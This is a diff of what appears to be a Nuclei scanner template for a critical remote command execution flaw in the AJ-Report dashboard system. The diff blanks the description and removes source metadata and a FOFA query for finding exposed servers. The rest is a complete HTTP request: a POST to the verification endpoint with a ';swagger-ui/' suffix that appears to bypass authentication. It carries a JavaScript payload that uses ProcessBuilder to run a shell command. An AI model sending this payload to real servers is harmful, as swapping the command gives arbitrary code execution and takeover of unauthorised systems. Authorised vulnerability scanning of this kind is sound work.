@@ -3,12 +3,8 @@ info:
   name: AJ-Report数据大屏系统 verification 远程命令执行
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ert6cgnphhzkg0oh'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ert6cgnphhzkg0oh
-    fofa: title="AJ-Report" || body="/static/luckysheet/plugins/js/plugin.js"
 http:
 - raw:
   - 'POST /dataSetParam/verification;swagger-ui/ HTTP/1.1
@@ -30,8 +26,6 @@ http:
 
 
     Upgrade-Insecure-Requests: 1
-
-
 
 
     {"ParamName":"","paramDesc":"","paramType":"","sampleItem":"1","mandatory":true,"requiredFlag":1,"validationRules":"function verification(data){a = new java.lang.ProcessBuilder(\"id\").start().getInputStream();r=new java.io.BufferedReader(new java.io.InputStreamReader(a));ss='''';while((line = r.readLine()) != null){ss+=line};return ss;}"}
